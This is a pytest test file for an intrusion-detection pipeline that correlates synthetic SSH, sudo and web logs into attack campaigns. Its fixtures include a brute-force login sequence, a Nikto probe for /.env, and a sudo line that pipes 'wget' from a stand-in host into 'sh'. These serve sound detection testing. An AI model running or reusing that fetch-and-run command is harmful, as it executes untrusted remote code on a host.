from datetime import datetime, timezone
import pytest
from app.evaluate import evaluate
from app.generator import generate
from app.parsers import ingest
from app.pipeline import analyze

NOW = datetime(2026, 10, 4, 15, 0, tzinfo=timezone.utc)


def run(seed, scale=1.0):
    g = generate(seed, NOW, scale)
    p = ingest(list(g["files"].items()), NOW)
    rep = analyze(p)
    return g, p, rep, evaluate(rep, {e.id: e for e in p["events"]}, g["truth"])


@pytest.mark.parametrize("seed", list(range(1, 13)))
def test_random_attack_is_found_end_to_end(seed):
    g, p, rep, ev = run(seed)
    assert ev["merged_into_single_campaign"], "3 attacker IPs must collapse into one campaign"
    assert ev["attacker_ips_recovered"] == 3
    assert ev["stages_found"] == 6
    assert ev["exfil_destination_found"]
    assert ev["event_recall"] >= 0.95 and ev["event_precision"] >= 0.95
    assert ev["false_incidents"] == 0 and ev["decoy_events_wrongly_flagged"] == 0
    assert ev["decoys_suppressed_count"] == ev["decoys_planted"]


def test_same_seed_is_deterministic():
    a = generate(3, NOW)["files"]
    assert a == generate(3, NOW)["files"]
    assert a != generate(4, NOW)["files"]


def test_every_step_has_evidence_lines():
    _, p, rep, _ = run(2)
    for s in rep["incidents"][0]["steps"]:
        assert s["evidence_count"] >= 1 and all(0 <= i < len(p["events"]) for i in s["event_ids"])


def test_robust_to_scale_and_noise():
    for scale in (0.3, 2.0):
        _, _, _, ev = run(9, scale)
        assert ev["merged_into_single_campaign"] and ev["false_incidents"] == 0


def test_benign_only_logs_produce_no_incidents():
    g = generate(1, NOW)
    clean = {k: v for k, v in g["files"].items()}
    # keep only the normal-traffic portion by dropping every attack/decoy line
    drop = {(f, n) for f, n in g["truth"]["attack_lines"] + g["truth"]["decoy_lines"]}
    for f in clean:
        clean[f] = "\n".join(l for i, l in enumerate(clean[f].splitlines(), 1) if (f, i) not in drop) + "\n"
    rep = analyze(ingest(list(clean.items()), NOW))
    assert rep["stats"]["incidents"] == 0


def test_empty_input_does_not_crash():
    rep = analyze(ingest([("x.log", "")], NOW))
    assert rep["stats"]["events"] == 0 and rep["incidents"] == []


def test_performance_budget():
    _, _, rep, _ = run(1, 3.0)
    assert rep["stats"]["analysis_ms"] < 5000


def test_unrelated_attack_shape_single_ip_no_recon():
    """Held-out shape the generator never produces: one IP, guess -> login -> sudo, plus a slow login-only intruder."""
    lines = []
    for i in range(20):
        lines.append("Oct  4 03:00:%02d db01 sshd[7]: Failed password for admin from 185.9.9.9 port 5%03d ssh2" % (i, i))
    lines.append("Oct  4 03:01:00 db01 sshd[7]: Accepted password for admin from 185.9.9.9 port 5999 ssh2")
    lines.append("Oct  4 03:02:00 db01 sudo:   admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://x.example/a.sh | sh")
    rep = analyze(ingest([("auth_db01.log", "\n".join(lines) + "\n")], NOW))
    assert rep["stats"]["incidents"] == 1
    inc = rep["incidents"][0]
    assert inc["ips"] == ["185.9.9.9"] and len(inc["stages"]) >= 3 and inc["score"] >= 85


def test_mixed_timezone_inputs_align():
    web = '203.0.113.5 - - [04/Oct/2026:13:30:00 +0530] "GET /.env HTTP/1.1" 404 10 "-" "Nikto/2"\n' * 6
    auth = "Oct  4 08:00:01 web01 sshd[1]: Failed password for root from 203.0.113.5 port 1 ssh2\n"
    p = ingest([("access_web01.log", web), ("auth_web01.log", auth)], NOW)
    assert abs((p["events"][-1].ts - p["events"][0].ts).total_seconds()) < 5   # 13:30 +0530 == 08:00 UTC
